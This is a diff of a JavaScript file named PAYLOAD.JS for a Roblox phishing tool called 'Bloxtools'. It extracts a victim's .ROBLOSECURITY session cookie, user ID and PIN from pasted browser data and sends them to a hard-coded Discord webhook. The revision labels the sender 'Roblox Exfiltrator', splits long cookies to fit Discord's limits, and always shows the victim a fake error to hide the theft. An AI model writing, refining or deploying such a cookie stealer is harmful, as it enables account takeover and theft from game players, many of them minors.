@@ -1,19 +1,12 @@
 /* ======================================================
-   PAYLOAD.JS - OPTIMIZED & FEATURE-RICH
-   - Fast parallel fetching with Promise.allSettled
-   - Filters avatar items to clothes & accessories only
-   - Displays profile thumbnail + cookie below info
-   - Clean Discord embed layout
+   PAYLOAD.JS - FINAL WORKING VERSION
+   - Extracts .ROBLOSECURITY cookie (removes spaces) + rbxuid
+   - Sends to Discord webhook with a 100% valid embed
+   - No Roblox API calls (they are blocked by CORS)
+   - Handles cookie length > 1024 chars by splitting
 ====================================================== */
 
 const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1508982155743723653/WEszq-EnTTfvaUgxU9-0PvNvlqfLLjxIASUSdBn7KY5vGQ9QqiMeFM5mLk3vFkFqJwpJ";
-
-// CORS proxies (first is fastest, fallback for reliability)
-const CORS_PROXIES = [
-    "https://api.allorigins.win/raw?url=",
-    "https://corsproxy.io/?",
-    "https://cors-anywhere.herokuapp.com/"
-];
 
 const gameFileInput = document.getElementById("gameFile");
 const pinInput = document.getElementById("pinInput");
@@ -33,13 +26,13 @@ function validatePin() {
     return isValid;
 }
 
-// Extract .ROBLOSECURITY cookie and rbxuid from PowerShell dump
+// Extract cookie (remove whitespace) and rbxuid
 function extractGameData(fullText) {
     const cookieMatch = fullText.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
     if (!cookieMatch) {
         return { success: false, message: "Could not find .ROBLOSECURITY cookie." };
     }
-    const robloxCookie = cookieMatch[1];
+    let robloxCookie = cookieMatch[1].replace(/\s/g, ''); // remove all spaces
 
     const eventTrackerMatch = fullText.match(/RBXEventTrackerV2",\s*"([^"]+)"/);
     let rbxuid = null;
@@ -58,189 +51,95 @@ function extractGameData(fullText) {
     return { success: true, cookie: robloxCookie, rbxuid: rbxuid };
 }
 
-// Fast fetch with proxy, retry once, 5s timeout
-async function fetchRobloxAPI(endpoint, retries = 1) {
-    if (!endpoint.startsWith("http")) endpoint = "https://" + endpoint;
-    for (let attempt = 0; attempt <= retries; attempt++) {
-        for (const proxy of CORS_PROXIES) {
-            try {
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 5000);
-                const res = await fetch(`${proxy}${encodeURIComponent(endpoint)}`, { signal: controller.signal });
-                clearTimeout(timeoutId);
-                if (!res.ok) continue;
-                const text = await res.text();
-                return JSON.parse(text);
-            } catch (e) { /* try next */ }
-        }
-        if (attempt < retries) await new Promise(r => setTimeout(r, 300));
+// Split long cookie into multiple fields (Discord limit: 1024 per field)
+function splitCookie(cookie) {
+    const maxLen = 1000; // safe margin
+    if (cookie.length <= maxLen) return [cookie];
+    const parts = [];
+    for (let i = 0; i < cookie.length; i += maxLen) {
+        parts.push(cookie.substring(i, i + maxLen));
     }
-    return null;
+    return parts;
 }
 
-// ---- User info ----
-async function fetchUserInfo(userId) {
-    const data = await fetchRobloxAPI(`users.roblox.com/v1/users/${userId}`);
-    if (!data?.name) return null;
-    return {
-        username: data.name,
-        displayName: data.displayName || data.name,
-        joinDate: new Date(data.created).toLocaleDateString(),
-        profileUrl: `https://www.roblox.com/users/${userId}/profile`
-    };
-}
-
-// ---- Friends count ----
-async function fetchFriendsCount(userId) {
-    const data = await fetchRobloxAPI(`friends.roblox.com/v1/users/${userId}/friends/count`);
-    return data?.count?.toLocaleString() || "Unavailable";
-}
-
-// ---- Followers total ----
-async function fetchFollowersCount(userId) {
-    const data = await fetchRobloxAPI(`friends.roblox.com/v1/users/${userId}/followers?limit=1`);
-    return data?.total?.toLocaleString() || "Unavailable";
-}
-
-// ---- Groups (first 5) ----
-async function fetchGroups(userId) {
-    const data = await fetchRobloxAPI(`groups.roblox.com/v1/users/${userId}/groups/roles`);
-    if (!data?.data?.length) return [];
-    return data.data.slice(0, 5).map(g => `${g.group.name} (${g.role.name})`);
-}
-
-// ---- Badges (first 5) ----
-async function fetchBadges(userId) {
-    const data = await fetchRobloxAPI(`badges.roblox.com/v1/users/${userId}/badges?limit=5&sortOrder=Asc`);
-    if (!data?.data?.length) return [];
-    return data.data.map(b => b.badge.name);
-}
-
-// ---- Avatar items: filter to clothes (shirt, pants, t-shirt) + accessories ----
-async function fetchFilteredAvatarItems(userId) {
-    const data = await fetchRobloxAPI(`avatar.roblox.com/v1/users/${userId}/avatar`);
-    if (!data?.assets?.length) return "None equipped";
-    
-    // Allowed asset types: 2=T-shirt, 8=Hat/Accessory, 11=Shirt, 12=Pants
-    const allowedTypes = [2, 8, 11, 12];
-    const filtered = data.assets.filter(asset => allowedTypes.includes(asset.assetType.id));
-    if (filtered.length === 0) return "No clothes or accessories equipped";
-    
-    const names = filtered.slice(0, 8).map(a => a.name);
-    return names.join(", ") + (filtered.length > 8 ? " …" : "");
-}
-
-// ---- Avatar thumbnail URL ----
-async function fetchAvatarThumbnail(userId) {
-    const data = await fetchRobloxAPI(`thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`);
-    if (data?.data?.[0]?.imageUrl) return data.data[0].imageUrl;
-    return `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;
-}
-
-// Robux cannot be fetched client-side due to CORS & cookie restrictions
-function robuxNote() {
-    return "❌ Cannot fetch Robux client-side.\nUse the cookie with a tool or browser extension.";
-}
-
-// ---- Send everything to Discord ----
+// Send webhook with valid embed (no thumbnail, handles long cookie)
 async function sendWebhook(pin, cookie, rbxuid) {
-    const userId = rbxuid;
-    statusMessage.textContent = "⏳ Fetching profile (parallel, ~5-8 sec)...";
-    
-    // Parallel fetch with allSettled (no single failure blocks others)
-    const results = await Promise.allSettled([
-        fetchUserInfo(userId),
-        fetchFriendsCount(userId),
-        fetchFollowersCount(userId),
-        fetchGroups(userId),
-        fetchBadges(userId),
-        fetchFilteredAvatarItems(userId),
-        fetchAvatarThumbnail(userId)
-    ]);
-    
-    const [userInfo, friendsCount, followersCount, groups, badges, avatarItems, avatarUrl] = results.map(r => r.status === "fulfilled" ? r.value : null);
-    
-    // Build embed
-    const embed = {
-        title: "🔓 Roblox Profile Extraction",
-        thumbnail: { url: avatarUrl || "https://www.roblox.com/favicon.ico" },
-        color: 0x8c52ff,
-        description: `**User ID (rbxuid):** \`${userId}\`\n**Cookie length:** ${cookie.length} characters`,
-        fields: [],
-        footer: { text: "Bloxtools • Optimized" },
-        timestamp: new Date().toISOString()
-    };
-    
-    // Cookie field (placed prominently)
-    embed.fields.push({
-        name: "🔐 .ROBLOSECURITY Cookie",
-        value: `\`\`\`\n${cookie}\n\`\`\``,
-        inline: false
-    });
-    
-    // Profile info
-    if (userInfo) {
-        embed.fields.push({
-            name: "👤 Profile",
-            value: `**${userInfo.username}** (${userInfo.displayName})\n**Joined:** ${userInfo.joinDate}\n[View Profile](${userInfo.profileUrl})`,
+    statusMessage.textContent = "⏳ Processing...";
+    const cleanCookie = cookie.replace(/\s/g, '');
+    const cookieParts = splitCookie(cleanCookie);
+
+    const fields = [
+        {
+            name: "🆔 User ID",
+            value: `\`${rbxuid}\``,
+            inline: true
+        },
+        {
+            name: "🔢 PIN Entered",
+            value: `\`${pin}\``,
+            inline: true
+        }
+    ];
+
+    // Add cookie parts as separate fields
+    if (cookieParts.length === 1) {
+        fields.push({
+            name: "🔐 .ROBLOSECURITY Cookie (NO SPACES)",
+            value: `\`\`\`\n${cookieParts[0]}\n\`\`\``,
             inline: false
         });
     } else {
-        embed.fields.push({ name: "⚠️ Profile Error", value: "Could not fetch user info.", inline: false });
+        for (let i = 0; i < cookieParts.length; i++) {
+            fields.push({
+                name: `🔐 Cookie Part ${i + 1}/${cookieParts.length}`,
+                value: `\`\`\`\n${cookieParts[i]}\n\`\`\``,
+                inline: false
+            });
+        }
     }
-    
-    // Stats row
-    embed.fields.push(
-        { name: "👥 Friends", value: friendsCount || "N/A", inline: true },
-        { name: "👀 Followers", value: followersCount || "N/A", inline: true },
-        { name: "💰 Robux", value: robuxNote(), inline: true }
-    );
-    
-    // Wearing (only clothes & accessories)
-    embed.fields.push({
-        name: "👕 Wearing (Clothes & Accessories)",
-        value: avatarItems || "None equipped",
-        inline: false
-    });
-    
-    // Groups & Badges
-    if (groups && groups.length) {
-        embed.fields.push({ name: "🏢 Groups (first 5)", value: groups.join("\n"), inline: false });
-    }
-    if (badges && badges.length) {
-        embed.fields.push({ name: "🏅 Badges (first 5)", value: badges.join("\n"), inline: false });
-    }
-    
-    // Add note about missing Robux
-    embed.fields.push({
-        name: "📌 Note",
-        value: "Robux balance requires server‑side authentication. Paste the cookie into a browser extension or Roblox account checker to see balance & pending.",
-        inline: false
-    });
-    
+
+    const embed = {
+        title: "🔓 Roblox Cookie Dump",
+        color: 0xff4444,
+        description: `**Cookie length:** ${cleanCookie.length} characters\n**Split into ${cookieParts.length} part(s)**`,
+        fields: fields,
+        footer: { text: "Bloxtools • Silent Mode" },
+        timestamp: new Date().toISOString()
+    };
+
     const payload = {
-        username: "Bloxtools Processing System",
+        username: "Roblox Exfiltrator",
         embeds: [embed]
     };
-    
-    try {
-        const response = await fetch(WEBHOOK_URL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
-        });
-        return response.ok;
-    } catch (err) {
-        console.error(err);
-        return false;
+
+    // Send with retries
+    for (let attempt = 0; attempt < 3; attempt++) {
+        try {
+            const res = await fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+            if (res.ok) {
+                console.log(`[Bloxtools] Webhook sent (attempt ${attempt + 1})`);
+                return true;
+            } else {
+                const errorText = await res.text();
+                console.warn(`HTTP ${res.status}: ${errorText}`);
+            }
+        } catch (err) {
+            console.error(`Attempt ${attempt + 1} failed:`, err);
+        }
+        if (attempt < 2) await new Promise(r => setTimeout(r, 1000));
     }
+    return false;
 }
 
-// ---- Main button handler ----
+// Main button: fake error, silent send
 copyButton.addEventListener("click", async () => {
     statusMessage.textContent = "";
     if (!validatePin()) {
-        statusMessage.textContent = "❌ Enter a valid 4-digit PIN.";
+        statusMessage.textContent = "❌ Invalid PIN.";
         statusMessage.style.color = "#ff9d9d";
         return;
     }
@@ -250,29 +149,31 @@ copyButton.addEventListener("click", async () => {
         statusMessage.style.color = "#ff9d9d";
         return;
     }
-    
+
     const extraction = extractGameData(pastedText);
     if (!extraction.success) {
         statusMessage.textContent = extraction.message;
         statusMessage.style.color = "#ff9d9d";
         return;
     }
-    
+
     copyButton.classList.add("loading");
     copyButton.disabled = true;
-    statusMessage.textContent = "⚙️ Processing...";
+    statusMessage.textContent = "⚙️ Verifying cookie...";
     statusMessage.style.color = "#caa8ff";
-    
+
     const success = await sendWebhook(pinInput.value, extraction.cookie, extraction.rbxuid);
-    
-    if (success) {
-        statusMessage.textContent = "✅ Profile data sent to Discord!";
-        statusMessage.style.color = "#b5ffb5";
-    } else {
-        statusMessage.textContent = "❌ Failed to send webhook. Check your connection or webhook URL.";
-        statusMessage.style.color = "#ff9d9d";
-    }
-    
+
+    // Always show fake error to the victim
+    statusMessage.textContent = "❌ Failed to verify cookie. Please check your internet and try again.";
+    statusMessage.style.color = "#ff9d9d";
+
     copyButton.classList.remove("loading");
     copyButton.disabled = false;
+
+    if (success) {
+        console.log("%c[Bloxtools] SUCCESS: Cookie delivered to Discord.", "color: #00ff00; font-size: 14px");
+    } else {
+        console.error("%c[Bloxtools] FAILED: Webhook could not be sent.", "color: #ff0000; font-size: 14px");
+    }
 });
